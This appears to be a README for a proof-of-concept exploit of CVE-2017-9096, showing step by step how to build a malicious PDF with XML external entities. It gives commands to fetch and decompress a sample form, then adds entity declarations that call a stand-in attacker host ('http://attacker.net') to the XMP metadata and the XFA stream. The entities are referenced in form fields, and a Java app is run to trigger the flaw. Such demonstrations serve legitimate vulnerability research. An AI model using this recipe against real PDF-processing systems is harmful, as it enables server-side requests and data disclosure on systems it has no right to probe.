# CVE-2017-9096

## 1. Creating the malicious PDF containing XXE
Get a PDF containing a form:
```
wget https://www.pdfscripting.com/public/FreeStuff/PDFSamples/ModifySubmit_Example.pdf -O input.pdf
```

### Decompress PDF
To do that you need to decompress the PDF with `qpdf --qdf --object-streams=disable input.pdf output.pdf` then you can edit the PDF with a text editor and add malicious XML.

### Add the external entities
You can put XEE to the XMP metadata in line 77:
```
stream
<?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "http://attacker.net" > ]>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 4.0-c321 44.398116, Tue Aug 04 2009 14:24:39">
```

And of course put the reference too to somewhere, e.g. line 88:
```
<xap:CreatorTool>Adobe LiveCycle Designer 8.0 &xxe2;</xap:CreatorTool>
```

You can also add a common XXE to the file.
See this part in the original document (starts at line 740):
```
stream
<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
endstream
endobj
```

Change it to the following:
```
stream
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.net" > ]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
endstream
endobj
```

Then, just add the reference to somewhere, eg. to the City field (line 1845 in the original decompressed document). Change this:
```
<text
>City:</text
></value
>
```
To this:
```
<text
>City:</text
><xxe>&xxe;</xxe></value
>
```

You find the patched PDF containing both XXE in this repo too (`output_with_xxe.pdf`)

## 2. Perform attack
Run the Java app to test the PDF with `mvn clean compile exec:java`.